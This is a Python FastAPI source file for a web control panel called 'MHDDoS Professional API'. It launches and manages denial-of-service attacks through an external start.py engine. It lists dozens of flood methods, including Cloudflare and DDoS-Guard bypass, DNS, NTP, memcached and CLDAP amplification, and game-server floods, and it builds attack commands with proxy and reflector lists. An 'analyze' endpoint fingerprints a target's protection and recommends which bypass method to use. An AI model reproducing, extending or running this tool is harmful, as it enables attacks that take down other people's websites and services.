import asyncio
import contextlib
import json
import logging
import re
import sys
import tkinter as tk
from pathlib import Path
from tkinter import filedialog
from typing import Any
from urllib.parse import urlparse

import psutil
import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, ConfigDict, Field

# --- Logging Configuration ---
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger("api")

# --- Constants & Classifications ---
LAYER7: set[str] = {
    "BYPASS", "CFB", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
    "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
    "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
}

LAYER4_AMP: set[str] = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}

LAYER4_NORMAL: set[str] = {
    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION", "CPS", 
    "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP"
}

PROXY_TYPES: dict[str, str] = {"All Proxy": "0", "HTTP": "1", "SOCKS4": "4", "SOCKS5": "5", "RANDOM": "6"}

ANSI_ESCAPE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
BASE_DIR = Path(__file__).resolve().parent
CONFIG_PATH = BASE_DIR / "config.json"

# --- Global State ---
class EngineState:
    process: asyncio.subprocess.Process | None = None
    is_starting: bool = False
    connected_websockets: list[WebSocket] = []

state = EngineState()
app = FastAPI(title="MHDDoS Professional API", version="1.0.6")

# --- Pydantic Models ---
class AttackParams(BaseModel):
    model_config = ConfigDict(str_strip_whitespace=True)

    target: str
    method: str
    threads: int = Field(default=100, ge=1)
    duration: int = Field(default=3600, ge=1)
    proxy_type: str = "SOCKS5"
    proxy_list: str = ""
    rpc: int = Field(default=100, ge=1)
    reflector: str = ""
    proxy_refresh: int = Field(default=0, ge=0)
    auto_harvest: bool = False
    smart_rpc: bool = False

class ProxyProvider(BaseModel):
    type: int
    url: str
    timeout: int = Field(ge=1)

class UpdateProxyConfig(BaseModel):
    providers: list[ProxyProvider]

class StatusResponse(BaseModel):
    status: str
    message: str | None = None
    server: str | None = None
    recommendation: str | None = None
    status_code: int | None = None

class HealthResponse(BaseModel):
    status: str
    engine_active: bool
    is_starting: bool
    version: str

# --- Helper Functions ---
def build_attack_command(params: AttackParams) -> list[str]:
    """Safely constructs the command line arguments for start.py."""
    proxy_list_arg = params.proxy_list
    proxy_type_code = PROXY_TYPES.get(params.proxy_type, "5")
    
    if params.auto_harvest:
        proxy_list_arg = "auto_harvest.txt"
        harvest_path = BASE_DIR / "files" / "proxies" / "auto_harvest.txt"
        if harvest_path.exists():
            harvest_path.unlink(missing_ok=True)
    elif params.proxy_type == "All Proxy" and not proxy_list_arg:
        proxy_list_arg = "all.txt"
        
    command = [sys.executable, "-u", "start.py", params.method, params.target]
    
    if params.method in LAYER7:
        command.extend([
            proxy_type_code, 
            str(params.threads), 
            proxy_list_arg if proxy_list_arg else "default.txt", 
            str(params.rpc), 
            str(params.duration), 
            str(params.proxy_refresh)
        ])
    elif params.method in LAYER4_AMP:
        command.extend([
            str(params.threads), 
            str(params.duration), 
            params.reflector if params.reflector else "reflector.txt"
        ])
    elif params.method in LAYER4_NORMAL:
        if proxy_list_arg and proxy_list_arg.strip() != "":
            command.extend([
                str(params.threads), 
                str(params.duration), 
                proxy_type_code, 
                proxy_list_arg, 
                str(params.proxy_refresh)
            ])
        else:
            command.extend([
                str(params.threads), 
                str(params.duration)
            ])
            
    if params.smart_rpc:
        command.append("--smart")
        
    return command

async def broadcast_log(message: str) -> None:
    """Sends a log message to all connected WebSockets, removing dead clients."""
    if not state.connected_websockets:
        return
        
    dead_clients: list[WebSocket] = []
    for client in state.connected_websockets:
        try:
            await client.send_text(message)
        except Exception:
            dead_clients.append(client)
            
    for dead in dead_clients:
        if dead in state.connected_websockets:
            state.connected_websockets.remove(dead)

async def run_attack_subprocess(params: AttackParams) -> None:
    """Runs the attack process and pipes output to WebSockets."""
    command = build_attack_command(params)
    await broadcast_log(f"[*] LAUNCHING COMMAND: {' '.join(command)}")

    try:
        state.process = await asyncio.create_subprocess_exec(
            *command,
            cwd=str(BASE_DIR),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT
        )
        state.is_starting = False
        await broadcast_log("[*] COMMAND DEPLOYED: Tactical engine active.")
        
        if state.process.stdout:
            while True:
                line = await state.process.stdout.readline()
                if not line:
                    break
                decoded_line = line.decode('utf-8', errors='replace').strip()
                decoded_line = ANSI_ESCAPE.sub('', decoded_line)
                if decoded_line:
                    await broadcast_log(decoded_line)
                
        await state.process.wait()
        await broadcast_log("[*] COMMAND TERMINATED: Engine process stopped.")
    except Exception as e:
        logger.error(f"Engine Error: {e}")
        await broadcast_log(f"[!] CRITICAL ENGINE ERROR: {e}")
    finally:
        state.is_starting = False
        state.process = None

# --- API Endpoints ---
@app.get("/api/health", response_model=HealthResponse)
async def health_check() -> HealthResponse:
    return HealthResponse(
        status="online",
        engine_active=state.process is not None,
        is_starting=state.is_starting,
        version="1.0.6"
    )

class AnalyzeParams(BaseModel):
    target: str

@app.post("/api/analyze", response_model=StatusResponse)
async def analyze_target(params: AnalyzeParams) -> StatusResponse:
    import requests
    target = params.target if params.target.startswith("http") else f"http://{params.target}"
    
    try:
        res = requests.get(target, timeout=5, verify=False)
        headers = {k.lower(): v.lower() for k, v in res.headers.items()}
        server = headers.get("server", "")
        recommendation = "GET"
        
        if "cloudflare" in server or "cf-ray" in headers:
            recommendation = "CFB"
            server = "Cloudflare"
        elif "ddos-guard" in server or "ddg" in str(headers):
            recommendation = "DGB"
            server = "DDoS-Guard"
        elif "ovh" in server:
            recommendation = "OVH"
            server = "OVH"
        elif "nginx" in server or "apache" in server:
            recommendation = "BYPASS"
        
        return StatusResponse(
            status="success",
            server=server.title() if server else "Unknown",
            recommendation=recommendation,
            status_code=res.status_code
        )
    except requests.RequestException as e:
        return StatusResponse(status="error", message=f"Request failed: {e}")
    except Exception as e:
        return StatusResponse(status="error", message=str(e))

@app.post("/api/attack/start", response_model=StatusResponse)
async def start_attack(params: AttackParams) -> StatusResponse:
    if state.process is not None or state.is_starting:
        return StatusResponse(status="error", message="An attack sequence is already in progress.")
    
    state.is_starting = True
    asyncio.create_task(run_attack_subprocess(params))
    return StatusResponse(status="success", message="Attack sequence initiated.")

@app.post("/api/attack/stop", response_model=StatusResponse)
async def stop_attack() -> StatusResponse:
    if state.process is None:
        return StatusResponse(status="error", message="No active engine process found.")
    
    await broadcast_log("[*] INITIATING RECURSIVE TERMINATION: Cleaning up process tree...")
    try:
        pid = state.process.pid
        parent = psutil.Process(pid)
        for child in parent.children(recursive=True):
            child.kill()
        parent.kill()
        return StatusResponse(status="success", message="All tactical processes terminated.")
    except psutil.NoSuchProcess:
        state.process = None
        return StatusResponse(status="success", message="Process already purged.")
    except Exception as e:
        await broadcast_log(f"[!] TERMINATION ERROR: {e}")
        if state.process:
            with contextlib.suppress(Exception):
                state.process.kill()
        return StatusResponse(status="error", message=str(e))

@app.get("/api/config/proxies")
async def get_proxy_config() -> dict[str, Any]:
    try:
        if not CONFIG_PATH.exists():
            return {"status": "success", "providers": []}
            
        with CONFIG_PATH.open("r", encoding="utf-8") as f:
            config = json.load(f)
        return {"status": "success", "providers": config.get("proxy-providers", [])}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/config/proxies", response_model=StatusResponse)
async def update_proxy_config(data: UpdateProxyConfig) -> StatusResponse:
    for p in data.providers:
        url_str = p.url.strip()
        if not url_str:
            return StatusResponse(status="error", message="Source path cannot be empty.")
            
        if url_str.startswith("http://") or url_str.startswith("https://"):
            parsed = urlparse(url_str)
            if not parsed.netloc or not parsed.scheme:
                return StatusResponse(status="error", message=f"Invalid URL format: {url_str}")
        else:
            if not url_str.endswith(".txt") and not url_str.endswith(".json"):
                return StatusResponse(status="error", message=f"Local paths must be .txt or .json files: {url_str}")
            
    try:
        config: dict[str, Any] = {}
        if CONFIG_PATH.exists():
            with CONFIG_PATH.open("r", encoding="utf-8") as f:
                config = json.load(f)
            
        config["proxy-providers"] = [
            {"type": p.type, "url": p.url.strip(), "timeout": p.timeout} 
            for p in data.providers
        ]
        
        with CONFIG_PATH.open("w", encoding="utf-8") as f:
            json.dump(config, f, indent=4)
            
        return StatusResponse(status="success", message="Proxy sources updated.")
    except Exception as e:
        return StatusResponse(status="error", message=str(e))

@app.get("/api/tools/ping")
async def tool_ping(host: str) -> dict[str, Any]:
    from icmplib import ping
    try:
        host = host.replace("http://", "").replace("https://", "").split("/")[0]
        r = ping(host, count=4, interval=0.2)
        return {
            "status": "success",
            "address": r.address,
            "min_rtt": r.min_rtt,
            "avg_rtt": r.avg_rtt,
            "max_rtt": r.max_rtt,
            "packets_sent": r.packets_sent,
            "packets_received": r.packets_received,
            "is_alive": r.is_alive
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/tools/check")
async def tool_check(url: str) -> dict[str, Any]:
    import requests
    if not url.startswith("http"):
        url = f"http://{url}"
    try:
        res = requests.get(url, timeout=10, verify=False)
        return {
            "status": "success",
            "status_code": res.status_code,
            "online": res.status_code < 500
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/tools/info")
async def tool_info(host: str) -> dict[str, Any]:
    import requests
    host = host.replace("http://", "").replace("https://", "").split("/")[0]
    try:
        res = requests.get(f"https://ipwhois.app/json/{host}/", timeout=10)
        return res.json()
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/select_file")
async def select_file_dialog() -> dict[str, str]:
    def _open_dialog() -> str:
        root = tk.Tk()
        root.withdraw()
        root.wm_attributes('-topmost', 1)
        file_path = filedialog.askopenfilename(title="Resource Selector", filetypes=(("Text Files", "*.txt"), ("All Files", "*.*")))
        root.destroy()
        return file_path
    
    loop = asyncio.get_event_loop()
    path = await loop.run_in_executor(None, _open_dialog)
    return {"path": path or ""}

@app.websocket("/ws/logs")
async def websocket_endpoint(websocket: WebSocket) -> None:
    await websocket.accept()
    state.connected_websockets.append(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        if websocket in state.connected_websockets:
            state.connected_websockets.remove(websocket)

app.mount("/", StaticFiles(directory=str(BASE_DIR / "web"), html=True), name="web")

def run() -> None:
    uvicorn.run("api:app", host="127.0.0.1", port=8000, log_level="info")

if __name__ == "__main__":
    run()
